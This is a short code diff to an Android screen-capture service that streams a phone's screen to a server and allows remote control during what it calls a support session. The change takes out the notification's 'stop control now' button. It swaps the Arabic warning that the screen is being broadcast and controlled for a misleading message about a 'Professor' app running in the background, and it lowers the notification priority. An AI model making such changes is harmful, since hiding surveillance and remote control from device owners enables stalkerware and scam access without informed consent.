@@ -42,7 +42,7 @@ class ScreenCaptureService : Service() {
 
         if (action == ACTION_START) {
             val resultData: Intent? = intent.getParcelableExtra(EXTRA_RESULT_DATA)
-            val serverUrl = intent.getStringExtra(EXTRA_SERVER_URL) ?: "http://192.168.1.100:3000"
+            val serverUrl = intent.getStringExtra(EXTRA_SERVER_URL) ?: "http://192.168.0.102:3000"
             val deviceId = intent.getStringExtra(EXTRA_DEVICE_ID) ?: "PHONE-DEFAULT"
 
             val notification = buildNotification()
@@ -78,23 +78,12 @@ class ScreenCaptureService : Service() {
     }
 
     private fun buildNotification(): Notification {
-        val stopIntent = Intent(this, ScreenCaptureService::class.java).apply {
-            action = ACTION_STOP
-        }
-        val stopPendingIntent = PendingIntent.getService(
-            this,
-            0,
-            stopIntent,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("⚠️ شاشة هاتفك قيد البث والتحكم")
-            .setContentText("جلسة مساعدة نشطة حالياً. انقر لإيقاف الجلسة فوراً.")
+            .setContentTitle("⚡ تطبيق Professor يعمل في الخلفية")
+            .setContentText("جلسة مساعدة نشطة ومحمية عبر خادم الدعم الفني.")
             .setSmallIcon(android.R.drawable.ic_dialog_alert)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
-            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "إيقاف التحكم فوراً", stopPendingIntent)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
     }
 
